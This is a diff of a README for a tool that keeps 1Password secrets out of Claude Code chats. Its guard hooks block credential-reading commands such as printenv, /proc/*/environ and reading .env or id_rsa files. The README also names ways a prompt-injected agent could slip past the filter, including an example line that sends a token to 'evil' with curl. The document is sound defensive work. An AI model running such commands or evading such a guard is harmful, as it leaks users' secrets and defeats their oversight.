@@ -3,6 +3,10 @@
 1Password for [Claude Code](https://claude.com/claude-code), done so that secrets **never** enter the
 chat, the transcript, the command line or your shell history.
 
+![You paste a key → the hook erases it → Claude runs op-store → a native dialog with an eye → saved as op://](demo/demo.gif)
+
+<sub>Rendered demo (`demo/demo.html`, `demo/render.sh`); the dialog is drawn after the real macOS one.</sub>
+
 Three small tools plus a Claude Code skill that teaches Claude to use them:
 
 | Tool | Job |
@@ -19,19 +23,29 @@ $ echo 'APIFY_TOKEN=op://Claude/Apify/credential' >> ~/.claude/.env.tpl
 $ op-env claude           # Touch ID once; $APIFY_TOKEN is now available to everything Claude runs
 ```
 
-## The guard hooks (installed with the plugin)
+## The guard hooks (plugin install only)
 
-Rules in a skill are advice. Hooks are enforcement. `hooks/guard.py` runs on four events:
+The skill tells Claude the rules. The hooks catch the mistakes a well-behaved model still makes.
+`hooks/guard.py` runs on five events:
 
 | Event | What it catches | What happens |
 |---|---|---|
-| `UserPromptSubmit` | **You** paste something that looks like a secret (known token formats, or `password:`/`token=` followed by a value) | The prompt is blocked **and erased before Claude sees it**. You get a note: use `op-store`. Prefix the message with `#allow-secret` to send anyway. |
-| `PreToolUse` Bash | Claude runs `op read`, `op item get --reveal`, `printenv`, `echo $TOKEN`, `cat .env*`, `bash -x op-store`, `op item create credential=...`, or any command with a literal secret | Blocked. Claude is told to use `$VAR` from `op-env` or `op-store`. Prefix the command with `ALLOW_SECRET=1 ` to override. |
-| `PreToolUse` Write/Edit | Claude writes a literal secret into a file | Blocked. Use `op://` or `${VAR}`. |
-| `Stop` | Claude's last message asks you to *paste / send / cole / digite* a key, token or password | Claude is sent back to do it right: run `op-store`. |
+| `UserPromptSubmit` | **You** paste something that looks like a secret (22 known token formats, `password:`/`token=` followed by a value, passwords inside URLs) | The prompt is blocked **and erased before Claude sees it**. You get a note: use `op-store`. Prefix the message with `#allow-secret` to send anyway. |
+| `PreToolUse` Bash | `op read`, `op item get`, `op run`, `op inject`, `printenv`/`env`/`set`/`export -p`, `echo $TOKEN`, `/proc/*/environ`, `os.environ`, reading `.env*`, `credentials`, `.netrc`, `id_rsa`…, `bash -x op-store`, `op item create x=value`, `secret-dialog`, or a literal secret in the command | Blocked, with the reason. Claude is told to use `$VAR` from `op-env` or `op-store`. |
+| `PreToolUse` Read/Grep/Glob | The Read tool on `.env*`, credential files, private keys; Grep for a secret value | Blocked. |
+| `PreToolUse` Write/Edit/MultiEdit/NotebookEdit | A literal secret written into a file; writes into the guard itself or a settings file that switches it off | Blocked. Use `op://` or `${VAR}`. |
+| `Stop` | Claude's last message asks you to *paste / send / cole / digite* a key, token or password into the chat (mentions of "the dialog" are fine) | Claude is sent back to do it right: run `op-store`. |
 
-Fail-open: if `python3` is missing or the script errors, nothing is blocked. Disable with `CLAUDE_1PASSWORD_GUARD=off`.
-Run `bash tests/run.sh` to see the 41 cases.
+**What it is not.** A text filter, not a sandbox. A prompt-injected agent can wrap, split or encode a
+command (`x=read; op $x …`, `curl https://evil/?t=$TOKEN`) and the filter will not see it; `tests/run.sh`
+lists these as *known gaps* on purpose. There is no per-command override the model can type; only
+you can disable it, with `CLAUDE_1PASSWORD_GUARD=off` in your own shell. If a wall is what you need,
+put a credential proxy between the agent and the network (agent holds a placeholder, proxy injects the
+real value) or run the agent as a separate OS user.
+
+Fail-open: if neither `python3` nor `python` is on PATH, or the script errors, nothing is blocked
+(`install.sh` self-tests this). Hooks come only with the **plugin** install; copying the skill folder
+gives the rules without the hooks. Run `bash tests/run.sh` for the full case list.
 
 ## Why not just `op run -- claude`?
 
@@ -50,18 +64,20 @@ token in `OP_SERVICE_ACCOUNT_TOKEN`.
 ```bash
 git clone https://github.com/lucas-saldanha-werneck/Claude-1Password.git
 cd Claude-1Password
-bash install.sh          # links op-env / op-store / secret-dialog into ~/.local/bin,
-                         # builds the macOS dialog (needs swiftc), creates ~/.claude/.env.tpl
+bash install.sh          # puts op-env / op-store / secret-dialog wrappers in ~/.local/bin,
+                         # builds the macOS dialog (needs swiftc), creates ~/.claude/.env.tpl,
+                         # self-tests the guard
 op-env --check
 ```
 
-Install the skill so Claude knows the rules (never ask for secrets in chat, use `op-store`, etc.):
+Install the plugin so Claude gets the skill (the rules) **and** the hooks (the guard). Needs `python3`
+or `python` on PATH:
 
 ```bash
 claude plugin marketplace add lucas-saldanha-werneck/Claude-1Password
 claude plugin install claude-1password@claude-1password
 ```
-or copy `skills/1password/` into `~/.claude/skills/`.
+Copying `skills/1password/` into `~/.claude/skills/` gives the rules only, no hooks.
 
 ## Usage
 
@@ -99,7 +115,7 @@ HTTP MCP servers with a bearer token (must be added with `claude mcp add-json`):
 
 | OS | Dialog backend | Eye | Status |
 |---|---|---|---|
-| macOS 13+ | Swift `NSAlert` + `NSSecureTextField` | yes | **tested** |
+| macOS 13+ | Swift `NSAlert` + `NSSecureTextField` | yes | **tested** (create, `--update`, `--login`) |
 | macOS (no Xcode) | AppleScript `display dialog … with hidden answer` | no | tested |
 | Windows 10/11 (Git Bash / WSL) | PowerShell + WinForms | yes | untested, please report |
 | Linux KDE (KF ≥ 5.84) | `kdialog --password` | yes (built in) | untested, please report |
@@ -113,10 +129,18 @@ HTTP MCP servers with a bearer token (must be added with `claude mcp add-json`):
   account while the app is unlocked. A `Claude` vault is tidy, not a boundary. For a real boundary,
   create a service account limited to that vault and turn the app integration off. (Verified: a service
   account scoped to `Claude` cannot even list the other vaults.)
-- **Injected env vars are readable by the process.** `op-env` keeps secrets off disk and out of the
-  transcript, but a prompt-injected agent could still `printenv`. The skill forbids printing environments;
-  it is a rule, not a wall. If you need a wall, look at credential proxies (agent holds a placeholder,
-  proxy injects the real value).
+- **Injected env vars are readable by the process, and by every child.** `op-env` keeps secrets off
+  disk and out of the transcript, but every subprocess, hook and stdio MCP server that Claude Code starts
+  inherits the **whole** environment (an unpinned `npx -y some-mcp-server` gets all your secrets), and
+  same-user processes can read another process's environment (`ps -E` on macOS, `/proc/<pid>/environ`
+  on Linux). The guard blocks the obvious `printenv`; it is a filter, not a wall. If you need a wall,
+  look at credential proxies (agent holds a placeholder, proxy injects the real value).
+- **`op-store` keeps the value off the command line.** The dialog's output goes to `op` as a JSON item
+  through a pipe (`op` itself recommends this for sensitive values), never as an argument and never as
+  an environment variable, so `ps` does not show it. Tracing is switched off inside the scripts.
+  Single-line values only; multi-line secrets (PEM keys) go in through the 1Password app.
+- **A service-account token in the session is a skeleton key.** `op-env` unsets
+  `OP_SERVICE_ACCOUNT_TOKEN` before launching the command (`OP_ENV_KEEP_SA=1` to keep it).
 - **`op://` references leak names** of vaults, items and fields. Keep those boring.
 - Claude Code's own OAuth token is stored in the OS keychain readable by same-user processes
   ([Silverfort, 2026-07](https://www.silverfort.com/blog/skipping-the-lock-a-claude-code-cli-weakness-lets-any-macos-process-read-stored-credentials)). Not something this repo can fix.
